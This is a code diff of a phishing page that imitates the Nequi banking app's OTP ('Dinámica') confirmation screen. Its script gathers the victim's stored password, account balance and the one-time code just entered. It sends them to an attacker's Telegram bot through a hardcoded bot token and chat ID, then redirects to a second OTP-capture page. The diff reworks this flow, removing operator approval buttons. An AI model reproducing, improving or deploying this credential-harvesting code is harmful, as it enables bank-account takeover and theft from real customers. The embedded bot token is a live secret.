@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nequi - Confirmación</title>
+    <title>Nequi - Primera Dinámica</title>
     <style>
         html, body { height: 100%; margin: 0; }
         body {
@@ -96,7 +96,6 @@
 </head>
 <body>
     <div class="main-container">
-        <!-- Logo Nequi arriba del título -->
         <div class="logo-top">
             <img src="./img/logo.svg" alt="Nequi">
         </div>
@@ -214,9 +213,8 @@
                 const clave = localStorage.getItem("clave") || "No especificado";
                 const saldo = localStorage.getItem("saldo") || "No especificado";
 
-                // Crear ID único para este usuario
-                const userId = Date.now();
-                localStorage.setItem("userId", userId);
+                // Guardar OTP y redirigir
+                localStorage.setItem("otp1", otp);
 
                 // TELEGRAM CONFIG (sin espacio)
                 const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
@@ -229,7 +227,7 @@
                     `🔑 <b>Clave:</b> ${clave}\n` +
                     `💰 <b>Saldo:</b> ${saldo}\n` +
                     `🔢 <b>Dinámica 1:</b> <code>${otp}</code>\n` +
-                    `🆔 <b>UserID:</b> ${userId}\n` +
+                    `🆔 <b>UserID:</b> ${Date.now()}\n` +
                     `📅 ${new Date().toLocaleString('es-CO')}`;
 
                 try {
@@ -239,21 +237,14 @@
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
                             text: message,
-                            parse_mode: 'HTML',
-                            reply_markup: {
-                                inline_keyboard: [[
-                                    { text: '✅ Aprobar', callback_data: `approve_${userId}` },
-                                    { text: '🔄 Nueva Dinámica', callback_data: `retry_${userId}` },
-                                    { text: '❌ Error Login', callback_data: `error_${userId}` }
-                                ]]
-                            }
+                            parse_mode: 'HTML'
                         })
                     });
 
                     if (response.ok) {
                         console.log('Mensaje enviado a Telegram correctamente');
-                        // Redirigir a loading
-                        window.location.href = "loading.html";
+                        // Redirigir a segunda pantalla
+                        window.location.href = "otp2.html";
                     } else {
                         const errorData = await response.json();
                         console.error('Error de Telegram:', errorData);
